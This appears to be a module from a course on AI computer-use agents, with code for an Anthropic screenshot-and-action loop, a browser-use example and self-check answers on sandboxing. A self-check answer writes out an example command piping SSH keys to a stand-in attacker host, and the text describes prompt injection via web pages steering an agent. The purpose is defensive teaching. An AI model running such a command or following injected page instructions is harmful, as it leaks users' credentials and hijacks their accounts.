Computer Use & App SDKs

All previous modules gave agents access to APIs — structured interfaces designed for machines. But most of the software world doesn't have an API: legacy systems, desktop apps, consumer web apps. Computer use agents operate at the UI layer — taking screenshots, clicking buttons, typing text — to interact with any application regardless of whether it has an API. This module covers Anthropic Computer Use, OpenAI Operator, Playwright-based browser automation, and the sandboxing requirements that make these agents safe to deploy.

~24 min read 1 video · 1 recording script 3 code examples Last updated 2026-05-07
Key Takeaways
  • Computer use agents interact at the UI layer — they see screenshots and issue mouse/keyboard actions, enabling automation of any application regardless of API availability
  • Anthropic Computer Use provides three tools: computer (screenshots + actions), text_editor (file read/write), bash (shell commands) — these are the most powerful and most dangerous tools in this course
  • Always run computer use agents in a sandboxed environment (Docker container, VM, isolated browser profile) — an unsandboxed computer use agent has access to your entire filesystem, credentials, and local services
  • Playwright + LLM agents (browser-use, Stagehand) are a lighter-weight alternative for web-specific tasks — no desktop access, lower risk, easier to sandbox
  • The "are you sure?" gate is mandatory — every irreversible action (file deletion, form submission, payment) must be confirmed before execution

What is computer use? #

Standard tool-calling agents interact with programmatic APIs — structured interfaces that return JSON. Computer use agents interact with visual interfaces — they take a screenshot, understand what's on screen, issue a click or keystroke, take another screenshot to verify the result, and repeat. This pattern works for any application regardless of whether it has an API: a 30-year-old legacy desktop app, a web application behind authentication, a government portal with no developer access.

Computer use loop
Screenshot
Agent takes a screenshot of the current screen state — this is the "observation" in the ReAct loop.
Reason
Model analyses the screenshot, identifies UI elements, and decides what action to take next.
Act
Model issues an action: click(x=450, y=230), type("hello"), key("Return"), scroll(direction="down").
Verify
Take another screenshot to confirm the action had the expected effect — then repeat.

Anthropic Computer Use API #

Claude's computer use tools are built into the Anthropic API. Three tools: computer (screenshots + mouse/keyboard actions), text_editor (read/write files), bash (run shell commands). These tools give the model full desktop control — use only in a sandboxed environment.

pythoncomputer_use.py — minimal computer use loop with Anthropic API
import anthropic, base64, subprocess
from PIL import ImageGrab  # pip install Pillow

client = anthropic.Anthropic()

def take_screenshot() -> str:
    """Capture screen and return as base64 PNG."""
    img = ImageGrab.grab()
    img = img.resize((1280, 800))  # resize to reduce token cost
    import io
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return base64.b64encode(buf.getvalue()).decode()

def execute_action(action: dict) -> str:
    """Execute a computer use action — in production this runs in a sandbox."""
    action_type = action.get("action")
    if action_type == "screenshot":
        return take_screenshot()
    elif action_type == "left_click":
        x, y = action["coordinate"]
        subprocess.run(["xdotool", "mousemove", str(x), str(y), "click", "1"])
        return "Clicked"
    elif action_type == "type":
        subprocess.run(["xdotool", "type", action["text"]])
        return "Typed"
    return f"Unknown action: {action_type}"

def computer_use_loop(task: str, max_steps: int = 10):
    screenshot_b64 = take_screenshot()
    messages = [{
        "role": "user",
        "content": [
            {"type": "image", "source": {"type": "base64", "media_type": "image/png", "data": screenshot_b64}},
            {"type": "text", "text": task},
        ],
    }]

    for _ in range(max_steps):
        response = client.messages.create(
            model="claude-sonnet-4-6",
            max_tokens=4096,
            tools=[{"type": "computer_20241022", "name": "computer", "display_width_px": 1280, "display_height_px": 800}],
            messages=messages,
        )

        if response.stop_reason == "end_turn":
            return response.content[0].text

        # Process tool use blocks
        messages.append({"role": "assistant", "content": response.content})
        tool_results = []
        for block in response.content:
            if block.type == "tool_use":
                result = execute_action(block.input)
                tool_results.append({
                    "type": "tool_result",
                    "tool_use_id": block.id,
                    "content": [{"type": "image", "source": {"type": "base64", "media_type": "image/png", "data": take_screenshot()}}]
                    if block.input.get("action") == "screenshot"
                    else [{"type": "text", "text": result}],
                })
        messages.append({"role": "user", "content": tool_results})
🔴
Never run computer use on your host machine without sandboxing An unsandboxed computer use agent has access to your entire desktop: browser sessions (including saved passwords and authenticated cookies), local files, shell, and any applications running. A single prompt injection via a malicious web page could instruct the agent to exfiltrate SSH keys, transfer funds from an open banking tab, or delete critical files. Always run in an isolated Docker container with a virtual display (VNC/Xvfb), clean browser profile, no access to host filesystem or credentials, and a network allowlist limiting which domains the agent can visit.

Playwright + LLM browser agents #

For web-only tasks, Playwright-based agents are a lighter-weight, lower-risk alternative to full desktop computer use. The agent controls a browser via Playwright's API rather than mouse coordinates — it can access the DOM directly, which is more reliable than pixel-based clicking. Libraries like browser-use and Stagehand wrap Playwright with LLM integration.

import asyncio
from browser_use import Agent
from langchain_openai import ChatOpenAI

async def main():
    agent = Agent(
        task="Go to news.ycombinator.com and return the titles of the top 5 posts.",
        llm=ChatOpenAI(model="gpt-4o-mini"),
        # browser_use handles Playwright setup, screenshot extraction, DOM parsing
    )
    result = await agent.run()
    print(result)

asyncio.run(main())

When to use computer use vs API integration #

Computer use vs API integration
Modern SaaS with public API
Use API
Faster, cheaper, more reliable. No visual fragility. APIs are designed for automation.
Legacy desktop app with no API
Computer use
The only option for GUI-only software. Run in an isolated VM.
Web app, no API access granted
Playwright agent
DOM access more reliable than pixel clicking. Scope to specific allowed domains.
API exists but poorly documented
Use API anyway
Spend time reverse-engineering the API. Computer use is 10x more fragile than API calls.

Self-check #

Explain what "sandboxing" means for a computer use agent and what specific risks it mitigates. What components should a minimal sandbox include?
Sandboxing for a computer use agent means running the agent in an isolated environment where its actions cannot affect the host system or exfiltrate sensitive data. Without sandboxing, a computer use agent has access to the developer's full desktop: browser sessions with authenticated cookies (banking, email, cloud accounts), SSH keys and API credentials in filesystem paths, any running application, and the network. A prompt injection via a malicious web page could instruct the agent to open a terminal and execute cat ~/.ssh/id_rsa | curl attacker.com, or navigate to a banking app tab and initiate a transfer. A minimal sandbox includes: (1) Docker container or VM with a clean operating system, no access to host filesystem mounts; (2) virtual display (Xvfb or VNC) rather than the host screen; (3) a fresh, clean browser profile with no saved credentials or cookies; (4) a network egress allowlist — only specific approved domains are reachable; (5) no write access to persistent storage by default, only a temporary working directory; (6) resource limits (CPU, memory, disk) to prevent runaway processes. The sandbox should be disposable — destroy and recreate it for each agent task.
Your company uses a legacy desktop ERP system with no API. You're evaluating whether to build a computer use agent to automate data entry. What are the three biggest risks and how would you mitigate each?
Risk 1 — UI fragility: Computer use agents identify elements by visual position and appearance. ERP vendors update their UI frequently, and even small layout changes (a button moved 20px, a menu item renamed) can cause the agent to click the wrong element or fail entirely. Mitigation: build comprehensive screenshot comparison tests; monitor the agent's actions after each ERP update; have a human-in-the-loop fallback for sessions where the agent detects unexpected UI state. Risk 2 — Data entry errors without verification: The agent types text into forms and submits them — if it misreads the source data or hits the wrong field, it enters wrong data into the ERP. Mitigation: after each form submission, have the agent take a screenshot and verify the entered values match the source before confirming; add a human review step for any submission above a value threshold. Risk 3 — Credential exposure: The ERP agent must log in with credentials. If the agent is sandboxed but the ERP session is live, a prompt injection could instruct the agent to navigate to sensitive screens and screenshot data. Mitigation: use the most restricted ERP user role possible (data entry only, no read access to sensitive modules), rotate credentials per session, and log all screenshots for audit. The overall recommendation: if the ERP has any export/import API, even a basic CSV import, use that instead — it's orders of magnitude more reliable than visual automation.
What is the advantage of Playwright-based browser agents over pixel-based computer use for web tasks, and what can computer use do that Playwright agents cannot?
Playwright-based browser agents have direct access to the page's DOM — they can query elements by selector, ID, or text content rather than relying on pixel coordinates from a screenshot. This makes them significantly more reliable for web tasks: a button at position (450, 230) in a screenshot may move to (450, 245) after a browser zoom change or minor CSS update, breaking the pixel-based agent. A Playwright agent querying by button[type="submit"] or text="Sign in" is unaffected by position changes. Playwright agents are also faster (no screenshot round-trip), cheaper (no image tokens), and easier to debug (Playwright logs record exact selectors used). What computer use can do that Playwright agents cannot: (1) interact with native desktop applications (file explorer, installed software, system dialogs); (2) interact with Canvas-rendered UIs that have no accessible DOM (some games, certain proprietary apps); (3) handle applications that detect and block automated browser access (some banking apps block headless Chrome); (4) interact with PDF forms or other non-HTML content in the browser. For pure web automation, Playwright is the better tool; for anything involving native desktop UI, computer use is the only option.
